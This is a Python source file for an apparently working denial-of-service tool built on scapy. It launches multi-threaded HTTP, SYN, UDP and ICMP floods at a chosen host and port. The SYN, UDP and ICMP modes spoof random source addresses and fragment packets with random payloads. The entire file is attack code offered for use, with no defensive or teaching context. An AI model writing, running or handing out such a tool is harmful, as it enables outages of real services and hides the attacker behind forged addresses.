from scapy.all import *
import argparse
import socket
import threading
import os
import random


parse = argparse.ArgumentParser(description="How to use:")
parse.add_argument("-t", type=str, help="Target host")
parse.add_argument("-p", type=int, help="Target port")
parse.add_argument("-m", type=str, help="Mode of flood", choices=["HTTP", "SYN", "UDP", "ICMP"])
parse.add_argument("-v", help="Verbose mode", type=str, choices=["true", "false"], default="true")
parse.add_argument("--threads", type=int, help="Number of Threads, default: 50", default=50)

############SYN mode:###############
parse.add_argument("--range", type=str, help="[SYN MODE / UDP MODE] Sub-net mask specification, ex: xxx.xxx.xxx.xxx/24")
parse.add_argument("-n", type=int, help="[SYN MODE / UDP MODE] Number of packets per sending, default: 100", default=100)
parse.add_argument("--size", type=int, help="[SYN MODE / UP MODE] Payload size, default: 1024 bytes", default=1024)

config = parse.parse_args()

cont = int(0)
threads_on = []

def icmp_flood_attack(target, port, verbose_status, size):
    while(True):
        if(config.range is not None):
            random_ip = RandIP(config.range)
        else:
            random_ip = RandIP()
        try:
            random_id = random.randint(0, 65535)
            random_payload = os.urandom(size)
            ip_icmp = IP(src=random_ip, dst=target)
            icmp = ICMP(id=random_id)
            packet_icmp = ip_icmp / icmp / Raw(load=random_payload)

            send(packet_icmp, verbose=False)
            if(verbose_status == "true"):
                print("\033[1;32m[+]\033[m \033[3mSending 1 ICMP request\033[m")
            else:
                continue
        except:
            print("\033[1;31mm[!] ICMP Request not sent\033[m")

def http_flood_attack(target, port, verbose_status):
    host = target
    while(True):
        get_request = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode("ascii")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        
        
        try:
            sock.send(get_request)
            if(verbose_status == "true"):
                print("\033[1;32m[+]\033[m \033[3mSending 1 GET Request\033[m")
            else:
                continue
            global cont
            cont += 1

        except:
            print("\033[1;31mm[!] GET Request not sent\033[m")

        sock.close()

        if(cont >= 200):
            cont = 0
            print("\n\033[1;33m[+] +200 GET requests have already been sent\033[m") 

def syn_flood_attack(target, port, verbose_status, n, size):
    for s in range(n):
        if(config.range is not None):
            random_ip = RandIP(config.range)
        else:
            random_ip = RandIP()
        ip_syn = IP(src=random_ip, dst=target)
        tcp_syn = TCP(sport=RandShort(), dport=port, flags="S")
        random_payload = os.urandom(size)

        packet_syn = ip_syn / tcp_syn / Raw(load=random_payload)
        fragments = fragment(packet_syn, fragsize=1400)
        for fragmentt in fragments:
            try:
                send(fragmentt, verbose=False)

                if(verbose_status == "true"):
                    print("\033[1;32m[+]\033[m \033[3m1 SYN packet sent\033[m")

                global cont
                cont += 1

            except Exception as err:
                print(f"\033[1;31m[!] Error to send SYN packet:\033[m {err}")

            
def udp_flood_attack(target, port, verbose_status, n, size):
    for s in range(n):
        if(config.range is not None):
            random_ip = RandIP(config.range)
        else:
            random_ip = RandIP()

        random_payload = os.urandom(size)
        packet_udp = IP(src=random_ip, dst=target)/UDP(sport=RandShort(), dport=port)/Raw(load=random_payload)
        fragments = fragment(packet_udp, fragsize=1400)
        for fragmentt in fragments:
            try:
                send(fragmentt, verbose=False)
                if(verbose_status == "true"):
                    print("\033[1;32m[+]\033[m \033[3m1 UDP packet sent\033[m")
                global cont
                cont += 1
                                    
            except Exception as err:
                print(f"\033[1;31m[+] Error to send UDP packet:\033[m {err}")


if __name__ == "__main__":

    print('''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣦⣤⣬⣭⣿⣿⣿⣿⣬.⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⢀⠜⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣽⣷⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡀
⢸⣿⣶⡶⠿⢿⣿⣿⣷⣶⣿⣿⡟⠛⠛⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⢿⡿⢿⣿⣿⣿⣿⠿⣿⢿⠿⠛⠇⠈⠛⠋⠉⠁⠈⠉⠉⠁⠈⠉⠉⠉⠀
⢸⣿⡇⠁⠈⠉⣠⣾⡿⠋⠉⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⡿⡿⠛⢿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⡇⢀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡿⠆⠃⠀⠠⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⡟⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⡟⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠃⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠒⠒⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                       \033[32m83 104 111 111 116 101 114  112 114 111 116 111 99 111 108\033[m
                                    \033[1;32m~$\033[m \033[3m0xgrah4m\033[m

    ''')
    if(config.m == "HTTP" and config.t != "" and config.p is not None):
        print("\033[1;32m[+] Starting HTTP flood attack\033[m")
        try:
            for t in range(config.threads):
                thread = threading.Thread(target=http_flood_attack, args=(config.t, config.p, config.v))
                thread.start()
        except Exception as err:
            print(f"\033[!] Error starting threads:\033[m {err}")

    elif(config.m == "SYN" and config.t != "" and config.p is not None):
        print("\033[1;32m[+] Starting SYN flood attack\033[m\n")
        print(f"\033[1;32m[+] Payload size:\033[m {config.size} bytes")
        try:
            for t in range(config.threads):
                thread = threading.Thread(target=syn_flood_attack, args=(config.t, config.p, config.v, config.n, config.size))
                thread.start()
                threads_on.append(thread)

            print(f"\033[1;32m[+]\033[m {config.n} loops performed by {config.threads} threads")
            for thd in threads_on:
                thd.join()
            
        except Exception as err:
            print(f"\033[!] Error starting threads:\033[m {err}")
        print(f"\033[1;33m[+] {cont} SYN packets sent\033[m")
                
    elif(config.m == "UDP" and config.t != "" and config.p is not None):
        print("\033[1;32m[+] Starting UDP flood attack\033[m\n")
        print(f"\033[1;32m[+] Payload size:\033[m {config.size} bytes")
        try:
            for t in range(config.threads):
                thread = threading.Thread(target=udp_flood_attack, args=(config.t, config.p, config.v, config.n, config.size))
                thread.start()
                threads_on.append(thread)
            for thd in threads_on:
                thd.join()
        except Exception as err:
            print(f"\033[!] Error starting threads:\033[m {err}")
            
        print(f"\033[1;33m[+] {cont} UDP packets sent\033[m")

    elif(config.m == "ICMP" and config.t != "" and config.p is not None):
        print("\033[1;32m[+] Starting ICMP flood attack\033[m\n")
        print(f"\033[1;32m[+] Payload size:\033[m {config.size} bytes")
        print(f"\033[1;33m------Infinite Attack------\033[m")
        try:
            for t in range(config.threads):
                thread = threading.Thread(target=icmp_flood_attack, args=(config.t, config.p, config.v, config.size))
                thread.start()
        except Exception as err:
            print(f"\033[!] Error starting threads:\033[m {err}")
        
    else:
        print("\033[1;31m[!] Unspecified arguments:\033[m Select IPv4 and the protocol number")

